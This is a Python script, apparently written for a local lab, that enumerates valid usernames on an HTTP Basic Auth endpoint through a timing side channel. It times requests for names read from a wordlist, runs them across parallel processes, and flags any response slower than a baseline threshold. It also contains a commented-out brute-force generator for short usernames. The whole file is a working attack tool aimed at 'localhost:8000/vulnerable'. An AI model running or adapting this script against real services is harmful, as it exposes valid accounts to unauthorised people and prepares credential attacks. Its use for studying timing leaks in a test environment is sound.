import base64
import concurrent.futures
import itertools
import random
import time
from string import digits, ascii_lowercase

import eventlet
import requests

eventlet.monkey_patch()

URL_BASE = "http://localhost:8000/vulnerable"
# URL_BASE = "https://webhook.site/92a94f7c-07c1-428b-831c-4b272bdb25c1"
MIN = 2
MAX = 4
CHARACTERS = ascii_lowercase + digits
THRESHOLD = 8.0

last_letter = None


def split_every(n, iterable):
    iterator = iter(iterable)
    return itertools.takewhile(bool, (list(itertools.islice(iterator, n)) for _ in itertools.repeat(None)))


def send_request(username, password):
    time_start = time.perf_counter()
    requests.get(URL_BASE, headers={
        "Authorization": "Basic " + base64.b64encode(f"{username}:{password}".encode("utf8")).decode()
    })
    return time.perf_counter() - time_start


def send_attack(username):
    global last_letter

    time_taken = send_request(username, ".")

    if username[:2] != last_letter:
        print(username, time_taken)
        last_letter = username[:2]

    return username, time_taken


def initialize_thread():
    send_attack("aa")
    send_attack("ab")
    send_attack("ac")


def attack():
    print(str(base64.b64encode(f"b:b".encode("utf8"))))
    temps_baseline = send_request(str(random.random()), "")
    timeout = temps_baseline + temps_baseline * THRESHOLD

    result = []

    print(temps_baseline, timeout)

    with concurrent.futures.ProcessPoolExecutor(max_workers=8, initializer=initialize_thread) as executor:
        with open("usernames.txt") as usernames:
            usernames = map(lambda x: x[:-1], usernames)
            for chunk in split_every(25, usernames):
                for username, time_taken in executor.map(send_attack, chunk):
                    if time_taken > timeout:
                        print("=====================")
                        print(username, time_taken)
                        print("=====================")
                        result.append(username)
                    print(result, end="\r")

    # pile = eventlet.GreenPile(8)
    # for length in range(MIN, MAX + 1):
    #     for username in itertools.product(*([CHARACTERS] * length)):
    #         username = "".join(username)
    #         pile.spawn(send_attack, (result, timeout, username, "."))
    return result


if __name__ == '__main__':
    print(attack())
